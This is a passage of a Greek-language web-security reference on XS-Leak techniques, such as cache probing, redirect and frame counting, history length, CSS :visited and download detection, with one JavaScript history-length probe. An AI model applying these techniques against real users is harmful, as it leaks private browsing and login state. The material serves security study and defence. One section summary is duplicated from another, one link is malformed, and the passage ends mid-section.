- **Περίληψη**: Αν η κεφαλίδα Origin ανακλάται στην κεφαλίδα `Access-Control-Allow-Origin`, είναι δυνατό να ελέγξετε αν ένας πόρος είναι ήδη στην κρυφή μνήμη.
- **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

Σε περίπτωση που η **κεφαλίδα Origin** ανακλάται στην κεφαλίδα `Access-Control-Allow-Origin`, ένας επιτιθέμενος μπορεί να εκμεταλλευτεί αυτή τη συμπεριφορά για να προσπαθήσει να **ανακτήσει** τον **πόρο** σε **CORS** λειτουργία. Αν δεν προκληθεί **σφάλμα**, σημαίνει ότι ανακτήθηκε **σωστά από το διαδίκτυο**, αν προκληθεί σφάλμα, είναι επειδή **προσεγγίστηκε από την κρυφή μνήμη** (το σφάλμα εμφανίζεται επειδή η κρυφή μνήμη αποθηκεύει μια απόκριση με μια κεφαλίδα CORS που επιτρέπει τον αρχικό τομέα και όχι τον τομέα του επιτιθέμενου).\
Σημειώστε ότι αν η προέλευση δεν ανακλάται αλλά χρησιμοποιείται ένα wildcard (`Access-Control-Allow-Origin: *`), αυτό δεν θα λειτουργήσει.

## Τεχνική Αναγνωρίσιμων Ιδιοτήτων

### Fetch Redirect

- **Μέθοδοι Συμπερίληψης**: Fetch API
- **Ανιχνεύσιμη Διαφορά**: Status Code
- **Περισσότερες πληροφορίες**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
- **Περίληψη:** GC και SA επιτρέπουν να ελέγξετε τον τύπο της απόκρισης (opaque-redirect) αφού ολοκληρωθεί η ανακατεύθυνση.
- **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

Υποβάλλοντας ένα αίτημα χρησιμοποιώντας το Fetch API με `redirect: "manual"` και άλλες παραμέτρους, είναι δυνατό να διαβάσετε την ιδιότητα `response.type` και αν είναι ίση με `opaqueredirect`, τότε η απόκριση ήταν μια ανακατεύθυνση.

### COOP

- **Μέθοδοι Συμπερίληψης**: Pop-ups
- **Ανιχνεύσιμη Διαφορά**: Header
- **Περισσότερες πληροφορίες**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
- **Περίληψη:** Σελίδες που προστατεύονται από την Πολιτική Ανοίγματος Διασυνοριακής Προέλευσης (COOP) αποτρέπουν την πρόσβαση από διασυνοριακές αλληλεπιδράσεις.
- **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

Ένας επιτιθέμενος είναι ικανός να deduce την παρουσία της κεφαλίδας Πολιτικής Ανοίγματος Διασυνοριακής Προέλευσης (COOP) σε μια απόκριση HTTP διασυνοριακής προέλευσης. Η COOP χρησιμοποιείται από διαδικτυακές εφαρμογές για να εμποδίσει εξωτερικούς ιστότοπους να αποκτούν αυθαίρετες αναφορές παραθύρων. Η ορατότητα αυτής της κεφαλίδας μπορεί να διακριθεί προσπαθώντας να αποκτήσετε την αναφορά **`contentWindow`**. Σε σενάρια όπου η COOP εφαρμόζεται υπό όρους, η **ιδιότητα `opener`** γίνεται ένας προειδοποιητικός δείκτης: είναι **undefined** όταν η COOP είναι ενεργή και **defined** στην απουσία της.

### URL Max Length - Server Side

- **Μέθοδοι Συμπερίληψης**: Fetch API, HTML Elements
- **Ανιχνεύσιμη Διαφορά**: Status Code / Περιεχόμενο
- **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
- **Περίληψη:** Ανιχνεύστε διαφορές στις αποκρίσεις επειδή το μήκος της απόκρισης ανακατεύθυνσης μπορεί να είναι πολύ μεγάλο ώστε ο διακομιστής να απαντήσει με σφάλμα και να δημιουργηθεί μια ειδοποίηση.
- **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

Αν μια ανακατεύθυνση από τον διακομιστή χρησιμοποιεί **είσοδο χρήστη μέσα στην ανακατεύθυνση** και **επιπλέον δεδομένα**. Είναι δυνατό να ανιχνευθεί αυτή η συμπεριφορά επειδή συνήθως οι **διακομιστές** έχουν ένα **όριο μήκους αιτήματος**. Αν τα **δεδομένα χρήστη** είναι **αυτό το μήκος - 1**, επειδή η **ανακατεύθυνση** χρησιμοποιεί **αυτά τα δεδομένα** και **προσθέτει** κάτι **επιπλέον**, θα προκαλέσει ένα **σφάλμα ανιχνεύσιμο μέσω των Σφαλμάτων**.

Αν μπορείτε με κάποιο τρόπο να ρυθμίσετε cookies σε έναν χρήστη, μπορείτε επίσης να εκτελέσετε αυτή την επίθεση ρυθμίζοντας αρκετά cookies ([**cookie bomb**](hacking-with-cookies/cookie-bomb.md)) έτσι ώστε με το **αυξημένο μέγεθος απόκρισης** της **σωστής απόκρισης** να προκληθεί ένα **σφάλμα**. Σε αυτή την περίπτωση, θυμηθείτε ότι αν προκαλέσετε αυτό το αίτημα από τον ίδιο ιστότοπο, το `<script>` θα στείλει αυτόματα τα cookies (έτσι μπορείτε να ελέγξετε για σφάλματα).\
Ένα παράδειγμα του **cookie bomb + XS-Search** μπορεί να βρεθεί στη Σκοπούμενη λύση αυτής της αναφοράς: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

`SameSite=None` ή να είναι στο ίδιο πλαίσιο είναι συνήθως απαραίτητο για αυτόν τον τύπο επίθεσης.

### URL Max Length - Client Side

- **Μέθοδοι Συμπερίληψης**: Pop-ups
- **Ανιχνεύσιμη Διαφορά**: Status Code / Περιεχόμενο
- **Περισσότερες πληροφορίες**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
- **Περίληψη:** Ανιχνεύστε διαφορές στις αποκρίσεις επειδή το μήκος της απόκρισης ανακατεύθυνσης μπορεί να είναι πολύ μεγάλο για ένα αίτημα ώστε να παρατηρηθεί μια διαφορά.
- **Παράδειγμα Κώδικα**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

Σύμφωνα με [την τεκμηρίωση του Chromium](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url_display_guidelines/url_display_guidelines.md#URL-Length), το μέγιστο μήκος URL του Chrome είναι 2MB.

> Γενικά, η _πλατφόρμα ιστού_ δεν έχει όρια στο μήκος των URLs (αν και το 2^31 είναι ένα κοινό όριο). _Ο Chrome_ περιορίζει τα URLs σε μέγιστο μήκος **2MB** για πρακτικούς λόγους και για να αποφευχθούν προβλήματα άρνησης υπηρεσίας στην επικοινωνία μεταξύ διαδικασιών.

Επομένως, αν η **ανακατεύθυνση URL** που απάντησε είναι μεγαλύτερη σε μία από τις περιπτώσεις, είναι δυνατό να την ανακατευθύνετε με ένα **URL μεγαλύτερο από 2MB** για να χτυπήσετε το **όριο μήκους**. Όταν συμβαίνει αυτό, ο Chrome εμφανίζει μια σελίδα **`about:blank#blocked`**.

Η **ανιχνεύσιμη διαφορά** είναι ότι αν η **ανακατεύθυνση** ολοκληρώθηκε, το `window.origin` ρίχνει ένα **σφάλμα** επειδή μια διασυνοριακή προέλευση δεν μπορεί να έχει πρόσβαση σε αυτές τις πληροφορίες. Ωστόσο, αν το **όριο** χτυπηθεί και η φορτωμένη σελίδα ήταν **`about:blank#blocked`**, η **`origin`** του παραθύρου παραμένει αυτή του **γονέα**, η οποία είναι μια **προσβάσιμη πληροφορία.**

Όλες οι επιπλέον πληροφορίες που χρειάζονται για να φτάσετε τα **2MB** μπορούν να προστεθούν μέσω ενός **hash** στο αρχικό URL ώστε να χρησιμοποιηθούν στην ανακατεύθυνση.

{{#ref}}
xs-search/url-max-length-client-side.md
{{#endref}}

### Max Redirects

- **Μέθοδοι Συμπερίληψης**: Fetch API, Frames
- **Ανιχνεύσιμη Διαφορά**: Status Code
- **Περισσότερες πληροφορίες**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76)
- **Περίληψη:** Χρησιμοποιήστε το όριο ανακατεύθυνσης του περιηγητή για να προσδιορίσετε την εμφάνιση ανακατευθύνσεων URL.
- **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

Αν ο **μέγιστος** αριθμός **ανακατευθύνσεων** που ακολουθεί ένας περιηγητής είναι **20**, ένας επιτιθέμενος θα μπορούσε να προσπαθήσει να φορτώσει τη σελίδα του με **19 ανακατευθύνσεις** και τελικά να **στείλει το θύμα** στη δοκιμασμένη σελίδα. Αν προκληθεί **σφάλμα**, τότε η σελίδα προσπαθούσε να **ανακατευθύνει το θύμα**.

### History Length

- **Μέθοδοι Συμπερίληψης**: Frames, Pop-ups
- **Ανιχνεύσιμη Διαφορά**: Ανακατευθύνσεις
- **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
- **Περίληψη:** Ο κώδικας JavaScript χειρίζεται την ιστορία του περιηγητή και μπορεί να προσπελαστεί μέσω της ιδιότητας μήκους.
- **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

Η **API Ιστορίας** επιτρέπει στον κώδικα JavaScript να χειρίζεται την ιστορία του περιηγητή, η οποία **αποθηκεύει τις σελίδες που επισκέπτεται ένας χρήστης**. Ένας επιτιθέμενος μπορεί να χρησιμοποιήσει την ιδιότητα μήκους ως μέθοδο συμπερίληψης: για να ανιχνεύσει την πλοήγηση JavaScript και HTML.\
**Ελέγχοντας το `history.length`**, κάνοντάς τον χρήστη να **πλοηγηθεί** σε μια σελίδα, **αλλάζοντας** την **πίσω** στην ίδια προέλευση και **ελέγχοντας** τη νέα τιμή του **`history.length`**.

### History Length with same URL

- **Μέθοδοι Συμπερίληψης**: Frames, Pop-ups
- **Ανιχνεύσιμη Διαφορά**: Αν το URL είναι το ίδιο με αυτό που μαντεύτηκε
- **Περίληψη:** Είναι δυνατό να μαντέψετε αν η τοποθεσία ενός frame/pop-up είναι σε μια συγκεκριμένη URL εκμεταλλευόμενοι το μήκος της ιστορίας.
- **Παράδειγμα Κώδικα**: Κάτω

Ένας επιτιθέμενος θα μπορούσε να χρησιμοποιήσει τον κώδικα JavaScript για να **χειριστεί την τοποθεσία του frame/pop-up σε μια μαντεμένη** και **άμεσα** **να την αλλάξει σε `about:blank`**. Αν το μήκος της ιστορίας αυξήθηκε, σημαίνει ότι το URL ήταν σωστό και είχε χρόνο να **αυξηθεί επειδή το URL δεν ανανεώνεται αν είναι το ίδιο**. Αν δεν αυξήθηκε, σημαίνει ότι **προσπάθησε να φορτώσει το μαντεμένο URL**, αλλά επειδή **άμεσα μετά** φορτώθηκε **`about:blank`**, το **μήκος της ιστορίας δεν αυξήθηκε ποτέ** κατά τη φόρτωση του μαντεμένου URL.
```javascript
async function debug(win, url) {
win.location = url + "#aaa"
win.location = "about:blank"
await new Promise((r) => setTimeout(r, 500))
return win.history.length
}

win = window.open("https://example.com/?a=b")
await new Promise((r) => setTimeout(r, 2000))
console.log(await debug(win, "https://example.com/?a=c"))

win.close()
win = window.open("https://example.com/?a=b")
await new Promise((r) => setTimeout(r, 2000))
console.log(await debug(win, "https://example.com/?a=b"))
```
### Frame Counting

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: Περιεχόμενο Σελίδας
- **More info**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
- **Summary:** Αξιολογήστε την ποσότητα των στοιχείων iframe ελέγχοντας την ιδιότητα `window.length`.
- **Code Example**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Η **καταμέτρηση των πλαισίων σε μια ιστοσελίδα** που ανοίγεται μέσω `iframe` ή `window.open` μπορεί να βοηθήσει στην αναγνώριση της **κατάστασης του χρήστη σε αυτή τη σελίδα**.\
Επιπλέον, αν η σελίδα έχει πάντα τον ίδιο αριθμό πλαισίων, η **συνεχής** παρακολούθηση του αριθμού των πλαισίων μπορεί να βοηθήσει στην αναγνώριση ενός **μοτίβου** που μπορεί να διαρρεύσει πληροφορίες.

Ένα παράδειγμα αυτής της τεχνικής είναι ότι στο Chrome, ένα **PDF** μπορεί να **ανιχνευθεί** με **καταμέτρηση πλαισίων** επειδή χρησιμοποιείται ένα `embed` εσωτερικά. Υπάρχουν [Open URL Parameters](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) που επιτρέπουν κάποιον έλεγχο πάνω στο περιεχόμενο όπως `zoom`, `view`, `page`, `toolbar` όπου αυτή η τεχνική θα μπορούσε να είναι ενδιαφέρουσα.

### HTMLElements

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Περιεχόμενο Σελίδας
- **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
- **Summary:** Διαβάστε την διαρρεύσουσα τιμή για να διακρίνετε μεταξύ 2 πιθανών καταστάσεων
- **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

Η διαρροή πληροφοριών μέσω HTML στοιχείων είναι μια ανησυχία στην ασφάλεια του διαδικτύου, ιδιαίτερα όταν δυναμικά αρχεία πολυμέσων παράγονται με βάση τις πληροφορίες του χρήστη, ή όταν προστίθενται υδατογραφήματα, αλλάζοντας το μέγεθος των πολυμέσων. Αυτό μπορεί να εκμεταλλευτεί από επιτιθέμενους για να διακρίνουν μεταξύ πιθανών καταστάσεων αναλύοντας τις πληροφορίες που εκτίθενται από ορισμένα HTML στοιχεία.

### Information Exposed by HTML Elements

- **HTMLMediaElement**: Αυτό το στοιχείο αποκαλύπτει την `duration` και τους `buffered` χρόνους του μέσου, οι οποίοι μπορούν να προσπελαστούν μέσω του API του. [Read more about HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
- **HTMLVideoElement**: Αποκαλύπτει το `videoHeight` και το `videoWidth`. Σε ορισμένους περιηγητές, είναι διαθέσιμες επιπλέον ιδιότητες όπως `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount`, και `webkitDecodedFrameCount`, προσφέροντας περισσότερες λεπτομέρειες σχετικά με το περιεχόμενο των πολυμέσων. [Read more about HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
- **getVideoPlaybackQuality()**: Αυτή η συνάρτηση παρέχει λεπτομέρειες σχετικά με την ποιότητα αναπαραγωγής βίντεο, συμπεριλαμβανομένων των `totalVideoFrames`, που μπορεί να υποδεικνύει την ποσότητα των δεδομένων βίντεο που επεξεργάζονται. [Read more about getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
- **HTMLImageElement**: Αυτό το στοιχείο διαρρέει το `height` και το `width` μιας εικόνας. Ωστόσο, αν μια εικόνα είναι μη έγκυρη, αυτές οι ιδιότητες θα επιστρέψουν 0, και η συνάρτηση `image.decode()` θα απορριφθεί, υποδεικνύοντας την αποτυχία φόρτωσης της εικόνας σωστά. [Read more about HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### CSS Property

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Περιεχόμενο Σελίδας
- **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
- **Summary:** Εντοπίστε τις παραλλαγές στο στυλ της ιστοσελίδας που σχετίζονται με την κατάσταση ή το καθεστώς του χρήστη.
- **Code Example**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Οι διαδικτυακές εφαρμογές μπορεί να αλλάξουν το **στυλ της ιστοσελίδας ανάλογα με την κατάσταση του χρήστη**. Τα αρχεία CSS διασυνοριακής προέλευσης μπορούν να ενσωματωθούν στη σελίδα του επιτιθέμενου με το **HTML link element**, και οι **κανόνες** θα **εφαρμοστούν** στη σελίδα του επιτιθέμενου. Αν μια σελίδα αλλάζει δυναμικά αυτούς τους κανόνες, ένας επιτιθέμενος μπορεί να **ανιχνεύσει** αυτές τις **διαφορές** ανάλογα με την κατάσταση του χρήστη.\
Ως τεχνική διαρροής, ο επιτιθέμενος μπορεί να χρησιμοποιήσει τη μέθοδο `window.getComputedStyle` για να **διαβάσει τις CSS** ιδιότητες ενός συγκεκριμένου HTML στοιχείου. Ως αποτέλεσμα, ένας επιτιθέμενος μπορεί να διαβάσει αυθαίρετες CSS ιδιότητες αν είναι γνωστό το επηρεαζόμενο στοιχείο και το όνομα της ιδιότητας.

### CSS History

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Περιεχόμενο Σελίδας
- **More info**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
- **Summary:** Ανιχνεύστε αν το στυλ `:visited` εφαρμόζεται σε μια διεύθυνση URL υποδεικνύοντας ότι έχει ήδη επισκεφθεί
- **Code Example**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

> [!NOTE]
> Σύμφωνα με [**αυτό**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/), αυτό δεν λειτουργεί στο headless Chrome.

Ο CSS επιλεγέας `:visited` χρησιμοποιείται για να στυλιζάρει τις διευθύνσεις URL διαφορετικά αν έχουν επισκεφθεί προηγουμένως από τον χρήστη. Στο παρελθόν, η μέθοδος `getComputedStyle()` μπορούσε να χρησιμοποιηθεί για να εντοπίσει αυτές τις διαφορές στυλ. Ωστόσο, οι σύγχρονοι περιηγητές έχουν εφαρμόσει μέτρα ασφαλείας για να αποτρέψουν αυτή τη μέθοδο από το να αποκαλύψει την κατάσταση ενός συνδέσμου. Αυτά τα μέτρα περιλαμβάνουν την επιστροφή του υπολογισμένου στυλ σαν να είχε επισκεφθεί ο σύνδεσμος και τον περιορισμό των στυλ που μπορούν να εφαρμοστούν με τον επιλεγέα `:visited`.

Παρά αυτούς τους περιορισμούς, είναι δυνατόν να διακριθεί η επισκεφθείσα κατάσταση ενός συνδέσμου έμμεσα. Μια τεχνική περιλαμβάνει την εξαπάτηση του χρήστη να αλληλεπιδράσει με μια περιοχή που επηρεάζεται από το CSS, χρησιμοποιώντας ειδικά την ιδιότητα `mix-blend-mode`. Αυτή η ιδιότητα επιτρέπει την ανάμειξη στοιχείων με το φόντο τους, αποκαλύπτοντας πιθανώς την επισκεφθείσα κατάσταση με βάση την αλληλεπίδραση του χρήστη.

Επιπλέον, η ανίχνευση μπορεί να επιτευχθεί χωρίς αλληλεπίδραση του χρήστη εκμεταλλευόμενη τους χρόνους απόδοσης των συνδέσμων. Δεδομένου ότι οι περιηγητές μπορεί να αποδώσουν τους επισκεφθέντες και μη επισκεφθέντες συνδέσμους διαφορετικά, αυτό μπορεί να εισαγάγει μια μετρήσιμη χρονική διαφορά στην απόδοση. Ένα αποδεικτικό της έννοιας (PoC) αναφέρθηκε σε μια αναφορά σφάλματος του Chromium, που αποδεικνύει αυτή την τεχνική χρησιμοποιώντας πολλαπλούς συνδέσμους για να ενισχύσει τη χρονική διαφορά, καθιστώντας έτσι την επισκεφθείσα κατάσταση ανιχνεύσιμη μέσω ανάλυσης χρόνου.

Για περισσότερες λεπτομέρειες σχετικά με αυτές τις ιδιότητες και μεθόδους, επισκεφθείτε τις σελίδες τεκμηρίωσης τους:

- `:visited`: [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
- `getComputedStyle()`: [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
- `mix-blend-mode`: [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)

### ContentDocument X-Frame Leak

- **Inclusion Methods**: Frames
- **Detectable Difference**: Headers
- **More info**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
- **Summary:** Στο Google Chrome, εμφανίζεται μια ειδική σελίδα σφάλματος όταν μια σελίδα αποκλείεται από το να ενσωματωθεί σε μια διασυνοριακή τοποθεσία λόγω περιορισμών X-Frame-Options.
- **Code Example**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

Στο Chrome, αν μια σελίδα με την κεφαλίδα `X-Frame-Options` ρυθμισμένη σε "deny" ή "same-origin" ενσωματωθεί ως αντικείμενο, εμφανίζεται μια σελίδα σφάλματος. Ο Chrome επιστρέφει μοναδικά ένα κενό αντικείμενο εγγράφου (αντί για `null`) για την ιδιότητα `contentDocument` αυτού του αντικειμένου, σε αντίθεση με τα iframes ή άλλους περιηγητές. Οι επιτιθέμενοι θα μπορούσαν να εκμεταλλευτούν αυτό αν ανιχνεύσουν το κενό έγγραφο, αποκαλύπτοντας πιθανώς πληροφορίες σχετικά με την κατάσταση του χρήστη, ειδικά αν οι προγραμματιστές ρυθμίζουν ασυνεπώς την κεφαλίδα X-Frame-Options, συχνά παραβλέποντας τις σελίδες σφάλματος. Η ευαισθητοποίηση και η συνεπής εφαρμογή των κεφαλίδων ασφαλείας είναι κρίσιμη για την αποτροπή τέτοιων διαρροών.

### Download Detection

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: Headers
- **More info**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
- **Summary:** Ένας επιτιθέμενος μπορεί να διακρίνει τις λήψεις αρχείων εκμεταλλευόμενος τα iframes; η συνεχής προσβασιμότητα του iframe υποδηλώνει επιτυχημένη λήψη αρχείου.
- **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

Η κεφαλίδα `Content-Disposition`, συγκεκριμένα `Content-Disposition: attachment`, δίνει εντολή στον περιηγητή να κατεβάσει το περιεχόμενο αντί να το εμφανίσει ενσωματωμένο. Αυτή η συμπεριφορά μπορεί να εκμεταλλευτεί για να ανιχνεύσει αν ένας χρήστης έχει πρόσβαση σε μια σελίδα που ενεργοποιεί μια λήψη αρχείου. Σε περιηγητές που βασίζονται στο Chromium, υπάρχουν μερικές τεχνικές για να ανιχνευθεί αυτή η συμπεριφορά λήψης:

1. **Παρακολούθηση Λωρίδας Λήψης**:
- Όταν ένα αρχείο κατεβαίνει σε περιηγητές που βασίζονται στο Chromium, εμφανίζεται μια λωρίδα λήψης στο κάτω μέρος του παραθύρου του περιηγητή.
- Παρακολουθώντας τις αλλαγές στο ύψος του παραθύρου, οι επιτιθέμενοι μπορούν να συμπεράνουν την εμφάνιση της λωρίδας λήψης, υποδεικνύοντας ότι έχει ξεκινήσει μια λήψη.
2. **Λήψη Πλοήγησης με Iframes**:
- Όταν μια σελίδα ενεργοποιεί μια λήψη αρχείου χρησιμοποιώντας την κεφαλίδα `Content-Disposition: attachment`, δεν προκαλεί ένα γεγονός πλοήγησης.
- Φορτώνοντας το περιεχόμενο σε ένα iframe και παρακολουθώντας τα γεγονότα πλοήγησης, είναι δυνατόν να ελέγξετε αν η διάταξη περιεχομένου προκαλεί μια λήψη αρχείου (χωρίς πλοήγηση) ή όχι.
3. **Λήψη Πλοήγησης χωρίς Iframes**:
- Παρόμοια με την τεχνική iframe, αυτή η μέθοδος περιλαμβάνει τη χρήση του `window.open` αντί για ένα iframe.
- Η παρακολούθηση των γεγονότων πλοήγησης στο νέο ανοιγμένο παράθυρο μπορεί να αποκαλύψει αν προκλήθηκε μια λήψη αρχείου (χωρίς πλοήγηση) ή αν το περιεχόμενο εμφανίζεται ενσωματωμένο (πλοήγηση συμβαίνει).

Σε σενάρια όπου μόνο οι συνδεδεμένοι χρήστες μπορούν να ενεργοποιήσουν τέτοιες λήψεις, αυτές οι τεχνικές μπορούν να χρησιμοποιηθούν για να συμπεράνουν έμμεσα την κατάσταση αυθεντικοποίησης του χρήστη με βάση την αντίδραση του περιηγητή στο αίτημα λήψης.

### Partitioned HTTP Cache Bypass <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

- **Inclusion Methods**: Pop-ups
- **Detectable Difference**: Χρόνος
- **More info**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
- **Summary:** Ένας επιτιθέμενος μπορεί να διακρίνει τις λήψεις αρχείων εκμεταλλευόμενος τα iframes; η συνεχής προσβασιμότητα του iframe υποδηλώνει επιτυχημένη λήψη αρχείου.
- **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (από [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

> [!WARNING]
> Αυτός είναι ο λόγος που αυτή η τεχνική είναι ενδιαφέρουσα: Το Chrome έχει τώρα **κατανομή cache**, και το κλειδί cache της νέας ανοιγμένης σελίδας είναι: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`, αλλά αν ανοίξω μια σελίδα ngrok και χρησιμοποιήσω fetch σε αυτήν, το κλειδί cache θα είναι: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, το **κλειδί cache είναι διαφορετικό**, οπότε η cache δεν μπορεί να μοιραστεί. Μπορείτε να βρείτε περισσότερες λεπτομέρειες εδώ: [Gaining security and privacy by partitioning the cache](https://developer.chrome.com/blog/http-cache-partitioning/)\
> (Σχόλιο από [**εδώ**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

Αν μια τοποθεσία `example.com` περιλαμβάνει έναν πόρο από `*.example.com/resource`, τότε αυτός ο πόρος θα έχει το **ίδιο κλειδί cache** όπως αν ο πόρος ζητούνταν απευθείας **μέσω πλοήγησης κορυφαίου επιπέδου**. Αυτό συμβαίνει επειδή το κλειδί cache αποτελείται από το κορυφαίο _eTLD+1_ και το frame _eTLD+1_.

Δεδομένου ότι η πρόσβαση στην cache είναι ταχύτερη από τη φόρτωση ενός πόρου, είναι δυνατόν να προσπαθήσετε να αλλάξετε τη θέση μιας σελίδας και να την ακυρώσετε 20ms (για παράδειγμα) μετά. Αν η προέλευση άλλαξε μετά την διακοπή, σημαίνει ότι ο πόρος είχε αποθηκευτεί στην cache.\
Ή θα μπορούσατε απλώς να **στείλετε κάποιο fetch στη δυνητικά αποθηκευμένη σελίδα και να μετρήσετε τον χρόνο που χρειάζεται**.

### Manual Redirect <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Ανακατευθύνσεις
- **More info**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7_0_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7_0_1234)
- **Summary:** Είναι δυνατόν να ανακαλύψετε αν μια απάντηση σε ένα αίτημα fetch είναι μια ανακατεύθυνση
- **Code Example**:

![](<../images/image (652).png>)

### Fetch with AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Χρόνος
- **More info**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
